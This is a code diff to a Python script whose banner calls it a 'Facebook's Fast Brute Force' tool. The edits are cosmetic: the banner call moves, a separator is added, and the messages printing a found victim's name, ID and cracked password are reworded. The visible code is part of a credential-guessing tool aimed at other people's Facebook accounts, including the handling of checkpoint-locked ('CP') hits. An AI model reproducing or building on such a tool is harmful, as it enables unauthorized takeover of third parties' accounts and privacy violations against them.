@@ -34,7 +34,6 @@ def banner():
   /_______  /\___  >\_//  |__/_______  //\033[37;1m
      v.01 \033[36;1m\//    \//  \033[37;1m    By IqbalDev\033[36;1m\//\033[31;1m
    Facebook's\033[30;1m Fast Brute Force \033[31;1m Tools''')
-banner()
 
 
 def login():
@@ -45,6 +44,7 @@ def login():
 
 	except IOError:
 
+            banner()
             print
             print h+" ["+a+"✓"+h+"]"+p+" Login Akun Facebook"
 	    username = raw_input(p+" ["+m+"∆"+p+"]"+a+" Username"+d+" : ")                            
@@ -93,6 +93,7 @@ def pengguna():
         ID1 = json.loads(dev.text)
         nama = ID1["name"]
         print k+" ["+p+"@"+k+"]"+h+" Selamat Datang "+p+nama
+        print d+35*"+"
 
     
 def brute_fast():
@@ -122,16 +123,20 @@ def brute_fast():
                     dev = json.loads(Dev_ID.text)
                     if "access_token" in dev:
                         print "\n \n"
-                        print a+" ["+p+"OK∆"+a+"]"+h+"Name Facebook  : "+p+ nam
-                        print a+" ["+p+"OK∆"+a+"]"+h+"Usernmame / ID : "+p+ email
-                        print a+" ["+p+"OK∆"+a+"]"+h+"Password Found : "+p+ pas
+                        runn("          Success...")
+                        print
+                        print a+" ["+p+"OK✓"+a+"]"+h+" Name Facebook  : "+p+ nam
+                        print a+" ["+p+"OK✓"+a+"]"+h+" Usernmame / ID : "+p+ email
+                        print a+" ["+p+"OK✓"+a+"]"+h+" Password Found : "+p+ pas
                         sys.exit()
 
                     elif "www.facebook.com" in dev["error_msg"]:
                         print "\n \n"
-                        print a+" ["+k+"CP∆"+a+"]"+h+"Name Facebook  : "+k+ nam
-                        print a+" ["+k+"CP∆"+a+"]"+h+"Usernmame / ID : "+k+ email
-                        print a+" ["+k+"CP∆"+a+"]"+h+"Password Found : "+k+ pas
+                        runn("          Success...")
+                        print
+                        print a+" ["+k+"CP✓"+a+"]"+h+" Name Facebook  : "+k+ nam
+                        print a+" ["+k+"CP✓"+a+"]"+h+" Usernmame / ID : "+k+ email
+                        print a+" ["+k+"CP✓"+a+"]"+h+" Password Found : "+k+ pas
                         sys.exit()
 
                     else:
@@ -139,7 +144,7 @@ def brute_fast():
             except:
     
               print
-              print "Keluar"
+              print "Terjadi Masalah \n "
     
 
 def target():
